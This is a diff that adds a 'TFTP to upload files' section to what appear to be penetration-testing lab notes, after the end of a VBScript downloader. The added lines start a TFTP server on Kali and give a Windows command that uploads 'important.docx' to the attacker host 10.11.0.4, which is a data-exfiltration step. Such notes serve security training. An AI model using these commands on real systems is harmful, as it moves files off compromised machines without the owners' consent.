@@ -108,3 +108,13 @@ Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
  Next 
  ts.Close
 ```
+### TFTP to upload files
+```
+kali: 
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+windows xp, 2003 etc:
+tftp -i 10.11.0.4 put important.docx
+```
